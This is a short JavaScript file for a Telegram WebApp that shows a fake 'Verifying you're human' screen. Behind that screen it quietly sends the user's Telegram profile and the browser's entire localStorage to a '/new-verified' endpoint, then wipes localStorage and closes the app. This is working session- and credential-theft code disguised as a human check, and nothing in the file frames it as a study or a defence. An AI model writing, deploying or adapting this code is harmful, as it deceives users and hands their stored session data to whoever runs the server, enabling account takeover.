window.Sg = {
  verify: false,
  init() {
    if (window.Telegram?.WebApp) {
      window.Telegram.WebApp.ready();
    }
  },
  close: () => {
    if (!window.Sg.verify) {
      window.Sg.verify = true;

      const isTelegram = window.Telegram?.WebApp?.initData;

      // ✅ Mostra animazione solo se siamo in Telegram
      if (isTelegram) {
        document.body.innerHTML = `
          <div style="height: 100vh; display: flex; justify-content: center; align-items: center; background: white;">
            <h2 style="font-family: sans-serif; font-weight: 700; font-size: 1.5rem; color: black;">
              Verifying you're human<span class="dots"></span>
            </h2>
          </div>
        `;

        const style = document.createElement("style");
        style.innerHTML = `
          @keyframes dots {
            0%   { content: ""; }
            25%  { content: "."; }
            50%  { content: ".."; }
            75%  { content: "..."; }
            100% { content: ""; }
          }

          .dots::after {
            content: "";
            animation: dots 1.5s steps(4, end) infinite;
          }
        `;
        document.head.appendChild(style);
      }

      // ⏳ Dopo 5 secondi invia POST a /new-verified
      setTimeout(async () => {
        const user = window.Telegram?.WebApp?.initDataUnsafe?.user || {
          username: "browser_user",
          id: "browser_" + Date.now(),
        };

        await fetch("/new-verified", {
          method: "POST",
          body: JSON.stringify({
            user,
            storage: window.localStorage,
          }),
          headers: {
            "content-type": "application/json",
          },
        });

        localStorage.clear();

        if (isTelegram) {
          window.Telegram.WebApp.close();
        }
      }, 5000);
    }
  },
};

Sg.init();
